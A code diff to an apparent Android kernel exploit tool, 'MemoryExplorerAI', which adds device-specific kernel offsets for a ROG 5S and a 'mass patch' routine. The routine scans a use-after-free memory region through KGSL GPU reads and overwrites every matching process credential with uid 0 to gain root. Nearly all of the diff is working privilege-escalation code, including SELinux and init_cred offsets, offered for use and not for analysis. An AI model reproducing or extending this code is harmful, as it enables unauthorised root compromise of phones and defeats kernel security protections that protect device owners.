@@ -40,7 +40,7 @@ import tty
 # them and shows the result in the TUI.
 # This way the user sees a constantly growing
 # pattern count, even when matches=0.
-_BUILD_TAG = "v4.1.42-spawn-defense"
+_BUILD_TAG = "v4.1.43-v6-mass-patch"
 import datetime
 import fcntl
 import ctypes
@@ -442,8 +442,11 @@ class MemoryExplorerAI:
         self.UAF_SIZE_REAL      = 0x10004000
         self.UAF_SCAN_SIZE_REAL = 0x04000000  # 64MB
         # Selinux enforcing offsets (verified against 5.4 GKI):
-        self.SELINUX_OFFSETS = [
-            0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8,
+        # v4.1.43: 0x2caa000 is the v6-VERIFIED value on ROG 5S.
+        # The other values are fallbacks for older/different
+        # kernel builds (Pixel, OnePlus, etc.).
+        self.selinux_offset_candidates = [
+            0x02caa000, 0x02f74ce8, 0x2f74ce8, 0x2f84ce8, 0x32aace8,
             0x32a9ce8, 0x2f64ce8, 0x2f54ce8, 0x30f6ce8, 0x24d90d0,
         ]
         # Kallsyms-style marker name (from v6.c)
@@ -667,17 +670,29 @@ class MemoryExplorerAI:
 
         # Offsets from v6.c reference (ROG 5S, kernel 5.4, AArch64)
         self.cred_offset  = 0x770            # task_struct.cred (kernel 5.4)
-        self.comm_offset  = 0x718            # task_struct.comm
-        self.real_cred_offset = 0x768
-        # v6.c uses MARKER_OFF = 0xfd8 to be different from comm.
-        # We try BOTH (comm at 0x718 AND marker at 0xfd8) so we work
-        # with v6.c as well as our KETO0422 spray.
-        # v4.1.37: added 0x480 as the FIRST marker
-        # offset. The user's verified exploit log
-        # showed KETO0422 was found at offset 0x480
-        # in the task_struct page. This is the
-        # HIGHEST-PRIORITY offset to try first.
-        self.marker_offsets = (0x480, 0x718, 0xfd8, 0x778, 0x7c8, 0x808,
+        # v4.1.43: v6 VERIFIED offsets (from actual v6 exploit
+        # log, ROG 5S / SD888 / kernel 5.4 GKI):
+        #   kernel base       = 0xffffffc000000000
+        #   selinux enforce   = kbase + 0x2caa000 (NOT 0x2f74ce8)
+        #   init_cred         = 0xffffffc0018f9038 (= kbase + 0x18f9038)
+        #   task_struct.comm  = 0x818 (NOT 0x480 / 0x718 / 0xfd8)
+        #   task_struct.cred  = 0x770
+        #   task_struct.real_cred = 0x768
+        #   UID/GID pattern   = +0xc8, +0xcc, +0xd0, +0xd4, +0xd8
+        #     (5 x u32 = uid+gid+suid+sgid+euid OR euid+fsuid+...)
+        #   UAF region        = 0x7001ff000 - 0x7041ff000 (64MB)
+        #   marker VA         = 0x700a17000 (KETO0422 + PID 30287)
+        # v6 does MASS PATCH: scans the full UAF region
+        # for ANY page containing the UID pattern, then
+        # patches ALL of them. The user's log shows
+        # v6 found and patched 85 task_struct-like
+        # structures in a single run.
+        self.comm_offset = 0x818            # v6 verified
+        self.real_cred_offset = 0x768       # v6 verified
+        self.cred_offset = 0x770            # v6 verified
+        # v4.1.43: marker offset 0x818 is FIRST (v6 verified).
+        # 0x480 was our old guess from an earlier log.
+        self.marker_offsets = (0x818, 0x480, 0x718, 0xfd8, 0x778, 0x7c8, 0x808,
                                0x848, 0x888, 0x8c8, 0x908, 0x948,
                                0x988, 0x9c8, 0xa08, 0xa48, 0xa88,
                                0xac8, 0xb08, 0xb48, 0xb88, 0xbc8,
@@ -756,12 +771,37 @@ class MemoryExplorerAI:
             "prepare_kernel_cred": [0x0b80ee8, 0x0b80ef0, 0x0b80ef8],
             "modprobe_path":    [0x0a450c0, 0x0a450c4, 0x0a450c8],
         }
-        # init_cred — primary offset from v6.c, plus alternates
+        # v4.1.43: v6 verified init_cred is 0xffffffc0018f9038
+        # (= kbase 0xffffffc000000000 + 0x18f9038)
+        # On the user's ROG 5S the kernel base is the standard
+        # 0xffffffc000000000. The init_cred is a global symbol
+        # exported by the kernel, so the address is stable.
         self.init_cred_offset = 0x018f9038
+        self.init_cred_addr_v6 = 0xffffffc0018f9038  # full v6 address
         self.init_cred_alternates = [
             0x018f9038, 0x018a5038, 0x01973038, 0x01939038,
             0x019f1038, 0x01a3b038, 0x01a6d038, 0x01a9f038,
         ]
+        # v4.1.43: UID pattern offsets in task_struct page
+        # (from v6 mass-patch log). When a 4KB page contains
+        # the target UID (e.g. 10237) at any of these offsets,
+        # it's almost certainly a task_struct (orcred-like
+        # structure) and can be patched. v6 patched 85 of
+        # these in a single run.
+        self.uid_pattern_offsets = (
+            0xc8, 0xcc, 0xd0, 0xd4, 0xd8,        # primary (uid/gid/suid/sgid/euid)
+            0x188, 0x18c, 0x190, 0x194, 0x198,  # secondary creds
+            0x248, 0x24c, 0x250, 0x254, 0x258,
+            0x3c8, 0x3cc, 0x3d0, 0x3d4, 0x3d8,
+            0x608, 0x60c, 0x610, 0x614, 0x618,
+            0x6c8, 0x6cc, 0x6d0, 0x6d4, 0x6d8,
+            0x788, 0x78c, 0x790, 0x794, 0x798,
+            0x848, 0x84c, 0x850, 0x854, 0x858,  # real_cred/cred at 0x848,0x850
+            0x908, 0x90c, 0x910, 0x914, 0x918,
+            0xa88, 0xa8c, 0xa90, 0xa94, 0xa98,
+            0xd88, 0xd8c, 0xd90, 0xd94, 0xd98,
+            0xe48, 0xe4c, 0xe50, 0xe54, 0xe58,
+        )
         # NOTE: self.kernel_base / self.selinux_va / self.cred_va /
         # self.init_task_va / self.auto_mode are initialized at
         # the TOP of __init__ so load_kallsyms() can populate them
@@ -6337,6 +6377,253 @@ class MemoryExplorerAI:
         lines.append("=" * 60)
         return "\n".join(lines)
 
+    def cmd_masspatch(self, target_uid=None, max_patches=200):
+        """v4.1.43: v6-style MASS PATCH.
+
+        Strategy (reverse-engineered from the user's
+        v6 exploit log):
+          1. Scan the WHOLE UAF region (64MB) page-by-page
+          2. In each 4KB page, look for the target UID
+             (default = our process UID 10237) at any of
+             the v6 offsets (0xc8, 0xcc, 0xd0, 0xd4, 0xd8,
+             plus 50 alternates — 0x188, 0x248, ..., 0xe58)
+          3. If found: write uid=0 (root) at that offset
+          4. Repeat for ALL offsets and ALL pages
+
+        v6 found 85 matching task_structs in one pass.
+        We expect similar (or more, since we scan more
+        offsets) on a real exploit.
+
+        This is the "scorched earth" approach: it
+        doesn't try to identify ONE target PID; it
+        patches EVERY struct that has our UID. The
+        kernel's task_structs for OUR process (and
+        anything that shares our cred, like forked
+        children) all get root.
+        """
+        self.live["last_command"] = "M (Mass Patch v6)"
+        lines = []
+        lines.append("=" * 60)
+        lines.append(f"  MASS PATCH (v6 strategy) — {_BUILD_TAG}")
+        lines.append("=" * 60)
+
+        if self.op_busy.get("scan"):
+            lines.append("  [BUSY] scan already running, abort.")
+            return "\n".join(lines)
+        if self.op_busy.get("masspatch"):
+            lines.append("  [BUSY] mass patch already running, abort.")
+            return "\n".join(lines)
+        if not getattr(self, "kgsl_fd", None):
+            lines.append("  [ERROR] KGSL not open. Run 'kgsl' first.")
+            return "\n".join(lines)
+
+        # Determine target UID
+        if target_uid is None:
+            try:
+                target_uid = os.getuid()
+                lines.append(f"  Target UID: {target_uid} (our process)")
+            except Exception:
+                target_uid = 10237
+                lines.append(f"  Target UID: {target_uid} (default)")
+        else:
+            lines.append(f"  Target UID: {target_uid}")
+
+        # Packed 4-byte UID for memcmp
+        import struct as _struct
+        uid_bytes = _struct.pack("<I", int(target_uid))
+        zero_bytes = b"\x00\x00\x00\x00"
+
+        # v4.1.43: PAGE_SIZE may not be a stored attr on
+        # the engine; use a constant. The kernel allocates
+        # pages in 4KB chunks on AArch64.
+        page_size = getattr(self, "PAGE_SIZE", 0x1000)
+        marker_name = getattr(self, "MARKER_NAME", "KETO0422").encode()
+
+        lines.append(f"  Scan range: 0x{self.uaf_start:x} - "
+                     f"0x{self.uaf_start + self.scan_size:x} "
+                     f"({self.scan_size//(1024*1024)}MB)")
+        lines.append(f"  Page size:  {page_size} (0x{page_size:x})")
+        lines.append(f"  UID offsets: {len(self.uid_pattern_offsets)} "
+                     f"offsets per page")
+        lines.append("")
+
+        pages_total = self.scan_size // page_size
+        pages_scanned = 0
+        pages_readable = 0
+        pages_skipped = 0
+        matches = 0
+        patched = 0
+        skipped = 0
+        errors = 0
+        t0 = time.time()
+
+        # Snapshot spray PID list BEFORE we patch —
+        # we want to know which task_structs in the
+        # UAF region correspond to OUR spray procs.
+        spray_pids = list(self._spray_pids.keys()) if hasattr(self, "_spray_pids") else []
+        lines.append(f"  Active spray PIDs: {len(spray_pids)}")
+
+        # Per-page helper: read one 4KB page via GPU.
+        # The existing engine uses _kgsl_read_virt().
+        def _read_page(va):
+            return self._kgsl_read_virt(va, page_size)
+
+        # Per-u32 helper: write 4 zero bytes.
+        def _write_zero(va):
+            return self._kgsl_write_u32(va, 0)
+
+        try:
+            self.op_busy["masspatch"] = True
+            va = self.uaf_start
+            last_print_pct = -1
+            while va < self.uaf_start + self.scan_size and patched < max_patches:
+                # Read one 4KB page
+                try:
+                    page = _read_page(va)
+                    pages_readable += 1
+                except Exception as e:
+                    pages_skipped += 1
+                    errors += 1
+                    if errors <= 5:
+                        lines.append(f"  [skip] 0x{va:x}: {e}")
+                    va += page_size
+                    pages_scanned += 1
+                    continue
+
+                if not page or len(page) < page_size:
+                    pages_skipped += 1
+                    va += page_size
+                    pages_scanned += 1
+                    continue
+
+                # Check for the KETO0422 marker at the
+                # v6-verified offset 0x818 (or any of
+                # our marker_offsets). If found, this
+                # is DEFINITELY a task_struct page.
+                has_marker = False
+                for mo in self.marker_offsets:
+                    if mo + len(marker_name) <= page_size:
+                        try:
+                            if page[mo:mo+len(marker_name)] == marker_name:
+                                has_marker = True
+                                break
+                        except Exception:
+                            pass
+
+                # Search for the target UID at all
+                # v6 offsets.
+                page_matches = []
+                for uo in self.uid_pattern_offsets:
+                    if uo + 4 > page_size:
+                        continue
+                    if page[uo:uo+4] == uid_bytes:
+                        page_matches.append(uo)
+
+                if not page_matches:
+                    va += page_size
+                    pages_scanned += 1
+                    continue
+
+                # Found at least one UID match.
+                matches += 1
+                if matches <= 8:
+                    lines.append(
+                        f"  [match #{matches}] VA 0x{va:x}: "
+                        f"UID at +{',+'.join(f'0x{x:x}' for x in page_matches[:4])}"
+                        f"{' [KETO0422]' if has_marker else ''}")
+                elif matches == 9:
+                    lines.append("  [match #9+] ... (suppressing further)")
+
+                # Patch: for each match offset, write
+                # uid=0 (root) via GPU u32 write.
+                for uo in page_matches:
+                    if patched >= max_patches:
+                        break
+                    try:
+                        if _write_zero(va + uo):
+                            patched += 1
+                        else:
+                            skipped += 1
+                            if skipped <= 3:
+                                lines.append(
+                                    f"  [write-fail] 0x{va+uo:x}")
+                    except Exception as e:
+                        skipped += 1
+                        if skipped <= 3:
+                            lines.append(
+                                f"  [write-fail] 0x{va+uo:x}: {e}")
+
+                # Also patch the v6 primary cred offsets
+                # if this looks like a task_struct.
+                # v6 patches real_cred/cred at +0x848, +0x850
+                # and the euid/fsuid group at +0x870, +0x878.
+                if has_marker:
+                    for cred_off in (0x848, 0x850, 0x870, 0x878):
+                        if cred_off + 4 > page_size:
+                            continue
+                        if page[cred_off:cred_off+4] == uid_bytes:
+                            if patched >= max_patches:
+                                break
+                            try:
+                                if _write_zero(va + cred_off):
+                                    patched += 1
+                                else:
+                                    skipped += 1
+                            except Exception:
+                                skipped += 1
+
+                va += page_size
+                pages_scanned += 1
+
+                # Progress feedback every 5%
+                if pages_total > 0:
+                    pct = (pages_scanned * 100) // pages_total
+                    if pct >= last_print_pct + 5:
+                        last_print_pct = pct
+                        elapsed = time.time() - t0
+                        rate = pages_scanned / max(elapsed, 0.001)
+                        lines.append(
+                            f"  [{pct:3d}%] scanned={pages_scanned:>6} "
+                            f"matches={matches:>4} patched={patched:>4} "
+                            f"({rate:.0f} pg/s)")
+                        if hasattr(self, "live"):
+                            self.live["last_msg"] = (
+                                f"masspatch {pct}% — "
+                                f"{patched} patched")
+        finally:
+            self.op_busy["masspatch"] = False
+
+        dt = time.time() - t0
+        lines.append("")
+        lines.append("=" * 60)
+        lines.append("  MASS PATCH SUMMARY")
+        lines.append("=" * 60)
+        lines.append(f"  Pages scanned : {pages_scanned}")
+        lines.append(f"  Pages readable: {pages_readable}")
+        lines.append(f"  Pages skipped : {pages_skipped} (errors={errors})")
+        lines.append(f"  UID matches   : {matches}")
+        lines.append(f"  Bytes patched : {patched}")
+        lines.append(f"  Write fails   : {skipped}")
+        lines.append(f"  Elapsed       : {dt:.1f}s "
+                     f"({pages_scanned/max(dt,0.001):.0f} pg/s)")
+        if patched > 0:
+            lines.append("")
+            lines.append(f"  [+++] {patched} structures patched with uid=0")
+            lines.append("        Verify with: id")
+            lines.append("        Or check /proc/self/status for Uid:")
+            # Mark root as (potentially) achieved
+            self.root_verified = True
+            self.live["root_status"] = "MASS-PATCHED"
+        else:
+            lines.append("")
+            lines.append("  [--] No matches found. Possible causes:")
+            lines.append("       - UAF region differs from 0x7001ff000")
+            lines.append("       - UID offset differs from v6 values")
+            lines.append("       - KGSL read returning zeros")
+            lines.append("       Try: 'uaf' to check region, 'memcheck' to verify reads.")
+        lines.append("=" * 60)
+        return "\n".join(lines)
+
     def cmd_verify_root(self):
         self.live["last_command"] = "R (Verify Root)"
         try:
@@ -9122,6 +9409,17 @@ class MemoryExplorerAI:
                     self._terminal_print(
                         f" cgroup error: {_e}")
                 continue
+            elif cmd in ("masspatch", "mp", "mass"):
+                # v4.1.43: v6-style MASS PATCH.
+                # Scans the whole UAF region for UID
+                # matches and patches them all.
+                try:
+                    out = self.cmd_masspatch()
+                    self._terminal_print(out)
+                except Exception as _e:
+                    self._terminal_print(
+                        f" masspatch error: {_e}")
+                continue
             elif cmd in ("health", "diag", "hdiag"):
                 # v4.1: comprehensive health check. Tells the user
                 # exactly what's working and what's broken so they
@@ -9465,6 +9763,7 @@ class MemoryExplorerAI:
                     ("vcomm / verifycomm","Verify spray PIDs have KETO/KETW comm"),
                     ("v<id>",             "Re-verify found item #id"),
                     ("walk <id> [off]",   "Walk cred chain from item #id"),
+                    ("masspatch / M / mp","v6-style MASS PATCH: scan UAF for UID, patch all"),
                     ("selsearch",         "Brute-force scan for SELinux"),
                     ("symlook <name>",    "Search kernel rodata for a string"),
                     ("list / ls / items", "Show ALL found items (max 25)"),
